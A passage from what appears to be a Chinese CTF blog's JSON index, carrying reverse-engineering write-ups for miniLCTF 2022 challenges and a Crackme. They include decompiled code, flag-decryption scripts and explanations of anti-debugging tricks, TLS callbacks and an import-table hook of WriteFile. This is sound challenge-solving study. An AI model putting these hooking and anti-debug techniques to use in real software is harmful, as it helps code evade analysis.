i32_load8_u(\u0026amp;w2c_memory, v41); v43 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v44 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v43; // s[a] v45 = i32_load8_u(\u0026amp;w2c_memory, v44); v46 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v47 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v46; // s[b] v48 = i32_load8_u(\u0026amp;w2c_memory, v47); v49 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v50 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v49; // s[a] v51 = i32_load8_u(\u0026amp;w2c_memory, v50); v52 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v53 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v52; // s[c] v54 = (((int)(unsigned __int8)(v51 + v48) \u0026gt;\u0026gt; 5) | (8 * (unsigned __int8)(v45 + v42))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v53); i32_store8(\u0026amp;w2c_memory, v53, v54); // s[c] ^= ((s[b] + s[a]) \u0026gt;\u0026gt; 5) | ((s[b] + s[a]) \u0026lt;\u0026lt; 3) v55 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v56 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v55; // s[d] v57 = i32_load8_u(\u0026amp;w2c_memory, v56); v58 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v59 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v58; // s[c] v60 = i32_load8_u(\u0026amp;w2c_memory, v59); v61 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v62 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v61; // s[d] v63 = i32_load8_u(\u0026amp;w2c_memory, v62); v64 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v65 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v64; // s[c] v66 = i32_load8_u(\u0026amp;w2c_memory, v65); v67 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v68 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v67; // s[a] v69 = (((int)(unsigned __int8)(v66 + v63) \u0026gt;\u0026gt; 7) | (2 * (unsigned __int8)(v60 + v57))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v68); return i32_store8(\u0026amp;w2c_memory, v68, v69); // s[a] ^= ((s[d] + s[c]) \u0026gt;\u0026gt; 7) | ((s[d] + s[c]) \u0026lt;\u0026lt; 1) } 复原原函数 int check(char *flag, char *key, char *enc){ char table[] = \u0026quot;0123456789abcdef\u0026quot;; char s[1000]; int flag_len = strlen(flag); int key_len = strlen(key); int enc_len = strlen(enc); int is_correct = 0; if(key_len \u0026gt;= 8 \u0026amp;\u0026amp; 4 * flag_len \u0026gt; enc_len \u0026amp;\u0026amp; 4 * flag_len \u0026lt;= enc_len){ int flag_cpy_len = (flag_len + 15) \u0026amp; ~15; char *flag_cpy_addr = malloc(flag_cpy_len); memset(flag_cpy_addr, 0, flag_cpy_len); memcpy(flag_cpy_addr, flag, flag_len); for(int i = 0; i \u0026lt; 8; i++){ s[i] = key[i]; } for(int i = 0; i \u0026lt; enc_len; i += 8){ for(int j = 0; j \u0026lt; 8; j++){ s[j + 8] = flag_cpy_addr[i + j]; } for(int j = 0; j \u0026lt; 42; j++){ qua_rou(s, 12LL, 8LL, 4LL, 0LL); qua_rou(s, 13LL, 9LL, 5LL, 1LL); qua_rou(s, 14LL, 10LL, 6LL, 2LL); qua_rou(s, 15LL, 11LL, 7LL, 3LL); qua_rou(s, 15LL, 10LL, 5LL, 0LL); qua_rou(s, 12LL, 11LL, 6LL, 1LL); qua_rou(s, 13LL, 8LL, 7LL, 2LL); qua_rou(s, 14LL, 9LL, 4LL, 3LL); } for(int j = 0; j \u0026lt; 16; j++){ is_correct |= (enc[2*j + 4*i] != table[s[j] / 16]); is_correct |= (enc[2*j + 4*i + 1] != table[s[j] % 16]); } } } return is_correct; } 逆它，重在理解每一步是在干啥，不用每一句都死逆\n如flag_cpy的复制可省略，key并无用处，最下面的for循环中/16和%16是分别对一个字节的低8位和高8位运算\n脚本\n#include\u0026lt;stdio.h\u0026gt; char enc[] = \u0026quot;05779c24d9249e693fa7ac4a10c68dfbd3520083b33f56e90fd84978b6a15c970b976779a8fefe91fb87d2221c9a1f87ed7eaddb8ae6370f9de69e3a7a5c5c488cde79756b0b9f1713e749edd41cff04\u0026quot;; char table[] = \u0026quot;0123456789abcdef\u0026quot;; char key[]=\u0026quot;D33.B4T0\u0026quot;; char flag[1000]; unsigned char s[1000]; int index(char c){ for(int i = 0; i \u0026lt; 16; i++){ if(table[i] == c) return i; } return -1; } void qua_rou_rev(char *s, int a, int b, int c, int d){ s[a] ^= ((((s[d] + s[c]) \u0026amp; 0xff) \u0026gt;\u0026gt; 7) | (((s[d] + s[c]) \u0026amp; 0xff) \u0026lt;\u0026lt; 1)) \u0026amp; 0xff; s[c] ^= ((((s[b] + s[a]) \u0026amp; 0xff) \u0026gt;\u0026gt; 5) | (((s[b] + s[a]) \u0026amp; 0xff) \u0026lt;\u0026lt; 3)) \u0026amp; 0xff; s[d] ^= ((((s[b] + s[c]) \u0026amp; 0xff) \u0026gt;\u0026gt; 6) | (((s[c] + s[b]) \u0026amp; 0xff) \u0026lt;\u0026lt; 2)) \u0026amp; 0xff; s[b] ^= ((((s[a] + s[d]) \u0026amp; 0xff) \u0026gt;\u0026gt; 4) | (((s[a] + s[d]) \u0026amp; 0xff) \u0026lt;\u0026lt; 4)) \u0026amp; 0xff; } int main(){ //0 8 16 24 32 for(int i = 0; i \u0026lt; 40; i += 8){ for(int j = 0; j \u0026lt; 16; j++){ s[j] = index(enc[2*j + 4*i]) * 16 + index(enc[2*j + 4*i + 1]);//分别取s[i]一个字节的低8未和高8位 } for(int j = 0; j \u0026lt; 42; j++){ qua_rou_rev(s, 14, 9, 4, 3); qua_rou_rev(s, 13, 8, 7, 2); qua_rou_rev(s, 12, 11, 6, 1); qua_rou_rev(s, 15, 10, 5, 0); qua_rou_rev(s, 15, 11, 7, 3); qua_rou_rev(s, 14, 10, 6, 2); qua_rou_rev(s, 13, 9, 5, 1); qua_rou_rev(s, 12, 8, 4, 0); } for(int j = 0; j \u0026lt; 16; j++){ flag[i+j] = s[j+8]; } } for(int i = 0; i \u0026lt; 40; i++){ printf(\u0026quot;%c\u0026quot;, flag[i]); } } miniLctf{0ooo00oh!h3ll0_WASM_h4ck3r!} twin ref:P.Z.师傅的wp\n创建或终止线程时，TLS回调函数都会自动调用执行\n在ida里找到TlsCallback_0，打开是空的，原因是里面有个反调试\n有一句call $+5实际是原地tp，后一句计算正确的地址，然后retn实现跳转，直接把它从这句一直到retn全都nop掉即可，后面还有很多处同理\n修复后的TlsCallback_0函数\nvoid __cdecl TlsCallback_0(int a1, int a2) { char *v2; // eax char Buffer[80]; // [esp+10h] [ebp-11Ch] BYREF struct _STARTUPINFOA StartupInfo; // [esp+60h] [ebp-CCh] BYREF struct _PROCESS_INFORMATION ProcessInformation; // [esp+A4h] [ebp-88h] BYREF char v7[22]; // [esp+B8h] [ebp-74h] BYREF char v8[4]; // [esp+CEh] [ebp-5Eh] BYREF char v9[44]; // [esp+D4h] [ebp-58h] BYREF char v10[12]; // [esp+100h] [ebp-2Ch] BYREF CHAR Name[8]; // [esp+10Ch] [ebp-20h] BYREF CHAR ApplicationName[8]; // [esp+114h] [ebp-18h] BYREF char v13[8]; // [esp+11Ch] [ebp-10h] BYREF char Format[7]; // [esp+124h] [ebp-8h] BYREF uint8_t v15; // [esp+12Bh] [ebp-1h] if ( a2 == 1 ) { memset(Buffer, 0, sizeof(Buffer)); sub_401930(Buffer); v15 = 0; v15 = NtCurrentPeb()-\u0026gt;BeingDebugged; if ( !v15 ) *(\u0026amp;TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60; strcpy(Name, \u0026quot;93\u0026gt;8\u0026quot;); sub_4018C0(Name); hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name); *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u); v7[0] = 47; v7[1] = 19; v7[2] = 26; v7[3] = 30; v7[4] = 12; v7[5] = 26; v7[6] = 95; v7[7] = 22; v7[8] = 17; v7[9] = 15; v7[10] = 10; v7[11] = 11; v7[12] = 95; v7[13] = 6; v7[14] = 16; v7[15] = 10; v7[16] = 13; v7[17] = 95; v7[18] = 25; v7[19] = 19; v7[20] = 30; v7[21] = 24; strcpy(v8, \u0026quot;E_\u0026quot;); v2 = (char *)sub_4018C0(v7); sub_401930(v2); Format[0] = 90; Format[1] = 12; Format[2] = 0; sub_4018C0(Format); sub_401130(Format, dword_404448[0]); } if ( !a2 ) { ApplicationName[0] = 81; ApplicationName[1] = 80; ApplicationName[2] = 11; ApplicationName[3] = 18; ApplicationName[4] = 15; ApplicationName[5] = 0; sub_4018C0(ApplicationName); sub_401410(); memset(\u0026amp;StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; CreateProcessA(ApplicationName, 0, 0, 0, 0, 3u, 0, 0, \u0026amp;StartupInfo, \u0026amp;ProcessInformation); v10[0] = 28; v10[1] = 16; v10[2] = 13; v10[3] = 13; v10[4] = 26; v10[5] = 28; v10[6] = 11; v10[7] = 117; v10[8] = 0; v13[0] = 8; v13[1] = 13; v13[2] = 16; v13[3] = 17; v13[4] = 24; v13[5] = 117; v13[6] = 0; v9[0] = 47; v9[1] = 19; v9[2] = 26; v9[3] = 30; v9[4] = 12; v9[5] = 26; v9[6] = 95; v9[7] = 28; v9[8] = 19; v9[9] = 16; v9[10] = 12; v9[11] = 26; v9[12] = 95; v9[13] = 11; v9[14] = 23; v9[15] = 26; v9[16] = 95; v9[17] = 27; v9[18] = 26; v9[19] = 29; v9[20] = 10; v9[21] = 24; v9[22] = 24; v9[23] = 26; v9[24] = 13; v9[25] = 95; v9[26] = 30; v9[27] = 17; v9[28] = 27; v9[29] = 95; v9[30] = 11; v9[31] = 13; v9[32] = 6; v9[33] = 95; v9[34] = 30; v9[35] = 24; v9[36] = 30; v9[37] = 22; v9[38] = 17; v9[39] = 117; v9[40] = 0; sub_401510(ApplicationName, (int)\u0026amp;ProcessInformation); if ( dword_404440 == 1 ) { sub_4012C0((_DWORD *)(*(_DWORD *)dword_404448 + 20), 5, (int)\u0026amp;unk_40405C); if ( !memcmp((const void *)(*(_DWORD *)dword_404448 + 20), \u0026amp;unk_40402C, 0x14u) ) { sub_4018C0(v10); sub_401930(v10); LABEL_13: CloseHandle(hObject); return; } } else if ( dword_404440 == -2 ) { sub_4018C0(v9); sub_401930(v9); goto LABEL_13; } sub_4018C0(v13); sub_401930(v13); goto LABEL_13; } } 其中a2存储了是创建进程还是退出进程的状态，从而执行不同的代码\n在程序开始的时候首先进入第一个if中的内容\n注意下面两句\nif ( !v15 ) *(\u0026amp;TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60; 把sub_401D60放在了TlsCallbacks之后，形成了个列表，创建或终止线程时会依次调用这两个函数\n接下来重点在用创建了新的文件tmp\n动调可得sub_401130是scanf的功能\n接着会进入上面在TlsCallbacks之后加上的sub_401D60\nvoid __cdecl __noreturn sub_401D60(int a1, int a2) { CHAR ModuleName[16]; // [esp+0h] [ebp-1Ch] BYREF CHAR ProcName[12]; // [esp+10h] [ebp-Ch] BYREF if ( a2 == 1 ) { ProcName[0] = 40; ProcName[1] = 13; ProcName[2] = 22; ProcName[3] = 11; ProcName[4] = 26; ProcName[5] = 57; ProcName[6] = 22; ProcName[7] = 19; ProcName[8] = 26; ProcName[9] = 0; ModuleName[0] = 20; ModuleName[1] = 26; ModuleName[2] = 13; ModuleName[3] = 17; ModuleName[4] = 26; ModuleName[5] = 19; ModuleName[6] = 76; ModuleName[7] = 77; ModuleName[8] = 81; ModuleName[9] = 27; ModuleName[10] = 19; ModuleName[11] = 19; ModuleName[12] = 0; sub_4018C0(ProcName); sub_4018C0(ModuleName); hModule = GetModuleHandleA(ModuleName); dword_4043DC = (int)GetProcAddress(hModule, ProcName); sub_4016C0(dword_4043DC, sub_401650, hModule); } ExitProcess(0xFFFFFFFF); } sub_4016C0实现了对WriteFile函数的hook int __cdecl sub_4016C0(int a1, int a2, HMODULE a3) { DWORD flOldProtect; // [esp+Ch] [ebp-10h] BYREF int v5; // [esp+10h] [ebp-Ch] HMODULE v6; // [esp+14h] [ebp-8h] LPVOID lpAddress; // [esp+18h] [ebp-4h] v6 = GetModuleHandleA(0); v5 = (int)v6 + *(_DWORD *)((char *)v6 + *((_DWORD *)v6 + 15) + 128); flOldProtect = 0; do { if ( !*(_DWORD *)(v5 + 16) || dword_4043D0 ) break; if ( a3 == GetModuleHandleA((LPCSTR)v6 + *(_DWORD *)(v5 + 12)) ) { for ( lpAddress = (char *)v6 + *(_DWORD *)(v5 + 16); lpAddress; lpAddress = (char *)lpAddress + 4 ) { if ( *(_DWORD *)lpAddress == a1 ) { VirtualProtect(lpAddress, 4u, 4u, \u0026amp;flOldProtect); *(_DWORD *)lpAddress = a2; VirtualProtect(lpAddress, 4u, flOldProtect, 0); dword_4043D0 = 1; break; } } } v5 += 20; } while ( !dword_4043D0 ); return dword_4043D0; } int __stdcall sub_401650(int a1, int a2, int a3, int a4, int a5) { *(_BYTE *)(a2 + 1822) = 6; *(_BYTE *)(a2 + 1713) = 6; dword_4043DC(a1, a2, a3, a4, a5); sub_4017C0(dword_4043DC, sub_401650, hModule); return 0; } 这里可以看到把文件中其中两个字节改成了6,后面有用\n执行完函数之后，有个ExitProcess，直接退出进程，再次调用TLS_Callback，这次进入第二个if\nsub_401410函数中调用了hook过的WriteFile函数，即修改了上述两个6，可以这时候再ida打开tmp文件，可以发现6原来是xxtea中右移的值\nCreateProcessA创建了新的进程，sub_401510函数实现了当前进程对子进程的调试\nsub_401510函数实现了该进程对子进程的调试监控\nBOOL __cdecl sub_401510(LPCSTR lpFileName, int a2) { CONTEXT Context; // [esp+8h] [ebp-33Ch] BYREF int v4[23]; // [esp+2D4h] [ebp-70h] BYREF HANDLE hThread; // [esp+330h] [ebp-14h] int v6; // [esp+334h] [ebp-10h] int v7; // [esp+338h] [ebp-Ch] int v8; // [esp+33Ch] [ebp-8h] int v9; // [esp+340h] [ebp-4h] v4[22] = *(_DWORD *)a2; hThread = *(HANDLE *)(a2 + 4); v6 = *(_DWORD *)(a2 + 8); v7 = *(_DWORD *)(a2 + 12); v9 = 1; while ( v9 ) { WaitForDebugEvent(\u0026amp;DebugEvent, 0xFFFFFFFF); if ( DebugEvent.dwDebugEventCode == 1 ) { qmemcpy(v4, \u0026amp;DebugEvent.u, 0x54u); v8 = v4[0]; if ( v4[0] == 0xC0000005 ) { memset(\u0026amp;Context, 0, sizeof(Context)); Context.ContextFlags = 65543; GetThreadContext(hThread, \u0026amp;Context); Context.Eip += 5; Context.Eax ^= 0x1B207u; SetThreadContext(hThread, \u0026amp;Context); } } if ( DebugEvent.dwDebugEventCode == 5 ) { dword_404440 = DebugEvent.u.Exception.ExceptionRecord.ExceptionCode; v9 = 0; } ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, 0x10002u); } Sleep(0x64u); return DeleteFileA(lpFileName); } 当子进程发生0xC0000005异常（即内存读写异常）时，利用GetThreadContext获取子进程的上下文，修改Eip和Eax的值 对应的异常触发可在tmp文件中找到 .text:0040122D mov eax, [ebp-4] .text:00401230 xor ebx, ebx .text:00401232 mov [ebx], ebx .text:00401234 mov eax, [ebp-4] .text:00401237 pop ebx .text:00401238 mov esp, ebp .text:0040123A pop ebp .text:0040123B retn xor ebx ebx之后ebx中的值为0，后一句取ebx的地址，触发了异常，进行了上述操作，最终效果是给xxtea解密的delta又异或上了0x1B207u\n异常处理过后，tmp继续执行，可以看到进行的是个xxtea加密\n有一个点需要注意，tmp是作为子进程被调试的，is_debugger_present应为1\n解密得到前半段flag，粘个脚本，xxtea加解密脚本引自官方\n#include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #define DELTA 479354212 //delta = ((0x9E3779B9 ^ 0x12345678 ^0x90909090 ^ 0x7b) + 12345) ^ 111111 #define MX (((z \u0026gt;\u0026gt; 6 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) { /* Coding Part */ rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do { sum += DELTA; e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = 0; p \u0026lt; n - 1; p++) { y = v[p + 1]; z = v[p] += MX; } y = v[0]; z = v[n - 1] += MX; } while (--rounds); } else if (n \u0026lt; -1) { /* Decoding Part */ n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = n - 1; p \u0026gt; 0; p--) { z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { unsigned int enc_flag[] = {0x6B7CE328, 0x4841D5DD, 0x963784DC, 0xEF8A3226, 0x0776B226}; char flag[40]; unsigned int key[] = {0x12, 0x90, 0x56, 0x78}; btea(enc_flag, -5, key); for(int i = 0; i \u0026lt; 20; i++){ flag[i] = *((char*)enc_flag + i); } puts(flag); } // sub_401510函数的返回值dword_404440正常情况应为1\n于是进入相应if语句\nsub_4012C0函数对内存中一段数据进行了xxtea加密\nint __cdecl sub_4012C0(_DWORD *a1, int a2, int a3) { int v3; // ecx int v4; // eax int v5; // edx int result; // eax int v7; // [esp+8h] [ebp-1Ch] int v8; // [esp+10h] [ebp-14h] unsigned int v9; // [esp+14h] [ebp-10h] unsigned int v10; // [esp+1Ch] [ebp-8h] unsigned int i; // [esp+20h] [ebp-4h] v8 = 52 / a2 + 6; v9 = 0; v10 = a1[a2 - 1]; do { v9 += dword_404058; v7 = (v9 \u0026gt;\u0026gt; 2) \u0026amp; 3; for ( i = 0; i \u0026lt; a2 - 1; ++i ) { v3 = ((v10 ^ *(_DWORD *)(a3 + 4 * (v7 ^ i \u0026amp; 3))) + (a1[i + 1] ^ v9)) ^ (((16 * v10) ^ (a1[i + 1] \u0026gt;\u0026gt; 3)) + ((4 * a1[i + 1]) ^ (v10 \u0026gt;\u0026gt; 5))); v4 = a1[i]; a1[i] = v3 + v4; v10 = v3 + v4; } v5 = (((v10 ^ *(_DWORD *)(a3 + 4 * (v7 ^ i \u0026amp; 3))) + (*a1 ^ v9)) ^ (((16 * v10) ^ (*a1 \u0026gt;\u0026gt; 3)) + ((4 * *a1) ^ (v10 \u0026gt;\u0026gt; 5)))) + a1[a2 - 1]; a1[a2 - 1] = v5; result = v5; v10 = v5; --v8; } while ( v8 ); return result; } 解密可得后半段flag，脚本如下，xxtea加解密脚本引自官方 #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #define DELTA 0x9E3779B9 #define MX (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 2) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 4)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) { /* Coding Part */ rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do { sum += DELTA; e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = 0; p \u0026lt; n - 1; p++) { y = v[p + 1]; z = v[p] += MX; } y = v[0]; z = v[n - 1] += MX; } while (--rounds); } else if (n \u0026lt; -1) { /* Decoding Part */ n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = n - 1; p \u0026gt; 0; p--) { z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { unsigned int enc_flag[] = {0x9021A921,0x0F53B3060,0x8E88A84E,0x43635AD5,0x0AC119239}; char flag[40]; unsigned int key[] = {0x12, 0x34, 0x56, 0x78}; btea(enc_flag, -5, key); for(int i = 0; i \u0026lt; 20; i++){ flag[i] = *((char*)enc_flag + i); } puts(flag); } // 3e90c91c02e9b40b78b} flagminiLctf{cbda59ff59e3e90c91c02e9b40b78b} CyberServer 咕咕咕 等我啥时候能写个这玩意再回来看吧 ","id":19,"section":"posts","summary":"not RC4 RISC-V 逆向，有找到ida的插件，但装上一直报错，放弃 又找到Ghidra，反编译很丑但能用，使劲看发现是个vm 大致流程及指令 0 0xf1 6 LAB_00100b7e 8 { int i; for","tags":["CTF","reverse"],"title":"miniLCTF 2022 Reverse 复盘 \u0026 wp","uri":"https://blog.dx39061.top/2022/05/minilctf-2022-reverse-%E5%A4%8D%E7%9B%98-wp/","year":"2022"},{"content":"Crackme 运行一下看图标知道是MFC\n拖进ida搜索字符串wrong就能找到事件处理函数\nint __thiscall sub_1131E0(struct_this *this) { const void *key_addr; // eax const void *flag_addr; // eax int result; // eax unsigned int key_len; // [esp+18h] [ebp-230h] size_t flag_len; // [esp+20h] [ebp-228h] BYREF void *md5_top_half_key; // [esp+24h] [ebp-224h] BYREF const void *md5_bottom_half_key; // [esp+28h] [ebp-220h] BYREF BYTE *v9; // [esp+2Ch] [ebp-21Ch] BYREF size_t dwDataLen; // [esp+30h] [ebp-218h] BYREF size_t v11; // [esp+34h] [ebp-214h] BYREF DWORD v12; // [esp+38h] [ebp-210h] BYREF BYTE flag[260]; // [esp+3Ch] [ebp-20Ch] BYREF BYTE key[260]; // [esp+140h] [ebp-108h] BYREF CWnd::UpdateData((CWnd *)this, 1); memset(key, 0, sizeof(key)); memset(flag, 0, sizeof(flag)); key_len = strlen(\u0026amp;this-\u0026gt;gap4[212]); flag_len = strlen(\u0026amp;this-\u0026gt;gap4[208]); dwDataLen = 0; v11 = 0; v12 = 0; key_addr = (const void *)sub_112590(\u0026amp;this-\u0026gt;gap4[212], key_len); memmove(key, key_addr, key_len); flag_addr = (const void *)sub_112590(\u0026amp;this-\u0026gt;gap4[208], flag_len); memmove(flag, flag_addr, flag_len); if ( key_len != 8 \u0026amp;\u0026amp; flag_len != 32 ) return wrong((CWnd *)this); hash_encode(key, key_len \u0026gt;\u0026gt; 1, 0x8003u, (int)\u0026amp;md5_top_half_key, (int)\u0026amp;dwDataLen);// md5 hash_encode(\u0026amp;key[4], key_len \u0026gt;\u0026gt; 1, 0x8004u, (int)\u0026amp;md5_bottom_half_key, (int)\u0026amp;v11);// sha1 hash_encode(key, key_len, 0x8003u, (int)\u0026amp;v9, (int)\u0026amp;v12);// md5 memcmp(md5_top_half_key, \u0026amp;this-\u0026gt;charDC, dwDataLen); if ( memcmp(md5_bottom_half_key, \u0026amp;this-\u0026gt;char1E0, v11) ) return wrong((CWnd *)this); md5_and_AES_encrypt(v9, v12, flag, \u0026amp;flag_len, 0x104u); if ( !memcmp(flag, \u0026amp;this-\u0026gt;char2E4, flag_len) ) result = success((CWnd *)this); else result = wrong((CWnd *)this); return result; } 结合动调很容易搞清楚各个变量、函数的意义，但这里有个反调很难发现\n参见ZwSetInformationThread - CTF Wiki\n字符串里搜ZwSetInformationThread可找到这个函数\nint __thiscall sub_112E60(LPARAM *this) { const CHAR *v1; // eax HMODULE v2; // eax HANDLE v3; // eax FARPROC ZwSetInformationThread; // [esp+8h] [ebp-24h] int i; // [esp+14h] [ebp-18h] int j; // [esp+14h] [ebp-18h] char v9[4]; // [esp+18h] [ebp-14h] BYREF int v10; // [esp+28h] [ebp-4h] CDialog::OnInitDialog((CDialog *)this); if ( sub_113AC0(0) ) { sub_111CB0(4u); sub_112100(v9); v10 = 0; sub_113D40(101); if ( !std::string::empty((std::string *)v9) ) { sub_113A60(0x800u, 0, 0); v1 = (const CHAR *)std::_Ptr_base\u0026lt;_EXCEPTION_RECORD const\u0026gt;::get(v9); sub_113A60(0, 0x10u, v1); } v10 = -1; sub_1129F0(v9); } sub_113A30(this[52], 1u); sub_113A30(this[52], 0); v2 = GetModuleHandleA(\u0026quot;ntdll.dll\u0026quot;); ZwSetInformationThread = GetProcAddress(v2, \u0026quot;ZwSetInformationThread\u0026quot;);//反调 v3 = GetCurrentThread(); ((void (__stdcall *)(HANDLE, int, _DWORD, _DWORD))ZwSetInformationThread)(v3, 17, 0, 0); for ( i = 0; i \u0026lt; 16; ++i ) *((_BYTE *)this + i + 220) ^= i; for ( j = 0; j \u0026lt; 20; ++j ) *((_BYTE *)this + j + 480) ^= j; return 1; } 并不是简单的调用了windows的系统函数，导致import窗口找不到，也增加了不少难度\n具体绕过方法ctf-wiki也写的很清楚，不再赘述\n结合重命名的函数应该能看得很清楚\nhash_encode函数\nbool __stdcall sub_113510(BYTE *pbData, DWORD dwDataLen, ALG_ID Algid, int a4, int a5) { BYTE *v6; // [esp+10h] [ebp-20h] BOOL v7; // [esp+18h] [ebp-18h] BYTE v8[4]; // [esp+1Ch] [ebp-14h] BYREF DWORD pdwDataLen; // [esp+20h] [ebp-10h] BYREF HCRYPTPROV phProv; // [esp+24h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+28h] [ebp-8h] BYREF phProv = 0; phHash = 0; v6 = 0; *(_DWORD *)v8 = 0; pdwDataLen = 0; v7 = CryptAcquireContextA(\u0026amp;phProv, 0, 0, 0x18u, 0xF0000000); if ( v7 ) { v7 = CryptCreateHash(phProv, Algid, 0, 0, \u0026amp;phHash); if ( v7 ) { v7 = CryptHashData(phHash, pbData, dwDataLen, 0); if ( v7 ) { pdwDataLen = 4; v7 = CryptGetHashParam(phHash, 4u, v8, \u0026amp;pdwDataLen, 0); if ( v7 ) { v6 = (BYTE *)sub_114540(*(size_t *)v8); if ( v6 ) { memset(v6, 0, *(size_t *)v8); v7 = CryptGetHashParam(phHash, 2u, v6, (DWORD *)v8, 0); if ( v7 ) { *(_DWORD *)a4 = v6; *(_DWORD *)a5 = *(_DWORD *)v8; } } else { v7 = 0; } } } } } if ( !v7 \u0026amp;\u0026amp; v6 ) sub_11453B(v6); if ( phHash ) CryptDestroyHash(phHash); if ( phProv ) CryptReleaseContext(phProv, 0); return v7; } 里面全是windows的API函数，重点看Algid参数，决定了hash的种类，具体参见ALG_ID (Wincrypt.h) - Win32 apps | Microsoft Docs\n即把8位的key分成2份，分别进行md5和sha1\n比较的值可以动调取得，然后在线网站爆，这里推荐一下https://crackstation.net/，cmd5收费实在是太屑了\n得到keyNocTuRne\n还剩一个md5_and_AES_encrypt函数对输入的flag加密\nbool __stdcall sub_1136E0(BYTE *pbData, DWORD dwDataLen, BYTE *a3, DWORD *pdwDataLen, DWORD dwBufLen) { BOOL v6; // [esp+4h] [ebp-18h] HCRYPTKEY phKey; // [esp+Ch] [ebp-10h] BYREF HCRYPTPROV phProv; // [esp+10h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+14h] [ebp-8h] BYREF phProv = 0; phHash = 0; phKey = 0; v6 = CryptAcquireContextA(\u0026amp;phProv, 0, 0, 0x18u, 0xF0000000); if ( v6 ) { v6 = CryptCreateHash(phProv, 0x8003u, 0, 0, \u0026amp;phHash); if ( v6 ) { v6 = CryptHashData(phHash, pbData, dwDataLen, 0); if ( v6 ) { v6 = CryptDeriveKey(phProv, 0x660Eu, phHash, 1u, \u0026amp;phKey); if ( v6 ) v6 = CryptEncrypt(phKey, 0, 1, 0, a3, pdwDataLen, dwBufLen); } } } if ( phKey ) CryptDestroyKey(phKey); if ( phHash ) CryptDestroyHash(phHash); if ( phProv ) CryptReleaseContext(phProv, 0); return v6; } 重点还是看Algid，0x8003对应md5，0x660e对应AES\n由于windows的AES和一般的AES不太一样，纯逆很难，所以直接模拟整个函数的过程，调用windows的CryptDecrypt函数，其他照抄\n此处ref：DASCTF-FATE-Reverse | Hexo\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;windef.h\u0026gt; #include \u0026lt;wincrypt.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; int main() { HCRYPTKEY phKey; // [esp+Ch] [ebp-10h] BYREF HCRYPTPROV phProv; // [esp+10h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+14h] [ebp-8h] BYREF BOOL retValue; BYTE flag_data[0x104] = { 0x5B, 0x9C, 0xEE, 0xB2, 0x3B, 0xB7, 0xD7, 0x34, 0xF3, 0x1B, 0x75, 0x14, 0xC6, 0xB2, 0x1F, 0xE8, 0xDE, 0x33, 0x44, 0x74, 0x75, 0x1B, 0x47, 0x6A, 0xD4, 0x37, 0x51, 0x88, 0xFC, 0x67, 0xE6, 0x60, 0xDA, 0x0D, 0x58, 0x07, 0x81, 0x43, 0x53, 0xEA, 0x7B, 0x52, 0x85, 0x6C, 0x86, 0x65, 0xAF, 0xB4 }; BYTE keyBuf[] = { 0x5c,0x53,0xa4,0xa4,0x1d,0x52,0x43,0x7a,0x9f,0xa1,0xe9,0xc2,0x6c,0xa5,0x90,0x90 }; DWORD dwDataLen = 0x10; DWORD dwBufLen = 0x104; DWORD dwDataLen_2; DWORD* pdwDataLen = \u0026amp;dwDataLen_2; *pdwDataLen = 0x20; phProv = 0; phHash = 0; phKey = 0; retValue = CryptAcquireContextA(\u0026amp;phProv, 0, 0, 0x18u, 0xF0000000); if (retValue) { retValue = CryptCreateHash(phProv, 0x8003u, 0, 0, \u0026amp;phHash); if 